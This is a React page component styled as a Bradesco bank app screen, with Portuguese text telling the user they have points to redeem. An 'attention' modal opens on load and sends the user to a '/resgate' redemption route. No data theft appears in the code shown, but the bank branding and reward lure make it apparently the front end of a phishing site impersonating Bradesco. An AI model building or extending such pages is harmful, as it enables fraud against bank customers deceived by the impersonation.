import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Menu, Bell } from "lucide-react";
import AttentionModal from "@/components/AttentionModal";
import bradescoLogo from "@/assets/bradesco-logo.png";
import BottomNav from "@/components/BottomNav";

const Index = () => {
  const navigate = useNavigate();
  const [modalOpen, setModalOpen] = useState(true);
  const [toggleOn, setToggleOn] = useState(false);

  return (
    <div className="min-h-screen bg-background max-w-md mx-auto relative">
      {/* Header */}
      <div className="bg-brand-dark px-5 pt-6 pb-16 rounded-b-3xl">
        <div className="flex items-center justify-between mb-8">
          <Menu className="text-primary-foreground" size={24} />
          <Bell className="text-primary-foreground" size={24} />
        </div>
        <div className="flex flex-col items-center gap-3">
          <div className="text-primary-foreground text-2xl font-bold tracking-wide">
            <img src={bradescoLogo} alt="Bradesco" className="h-8" />
          </div>
          <p className="text-primary-foreground/80 text-sm">
            Você possui pontos para resgate
          </p>
        </div>
      </div>

      {/* Content */}
      <div className="px-5 -mt-6 pb-32 space-y-4">
        {/* Points Card */}
        <div className="bg-card rounded-xl p-4 shadow-sm flex items-center justify-between">
          <span className="text-sm font-medium text-card-foreground">Resgatar pontos Bradesco</span>
          <button
            onClick={() => setToggleOn(!toggleOn)}
            className={`w-12 h-7 rounded-full transition-colors relative ${toggleOn ? "bg-primary" : "bg-muted"}`}
          >
            <span
              className={`absolute top-1 w-5 h-5 rounded-full bg-card shadow transition-transform ${
                toggleOn ? "translate-x-6" : "translate-x-1"
              }`}
            />
          </button>
        </div>

        {/* CTA Button */}
        <button className="w-full py-4 rounded-full bg-primary text-primary-foreground font-semibold text-base hover:opacity-90 transition-opacity">
          continuar para resgate
        </button>
      </div>

      {/* Bottom Navigation */}
      <BottomNav />

      {/* Attention Modal */}
      <AttentionModal
        open={modalOpen}
        onClose={() => setModalOpen(false)}
        onContinue={() => navigate("/resgate")}
      />
    </div>
  );
};

export default Index;
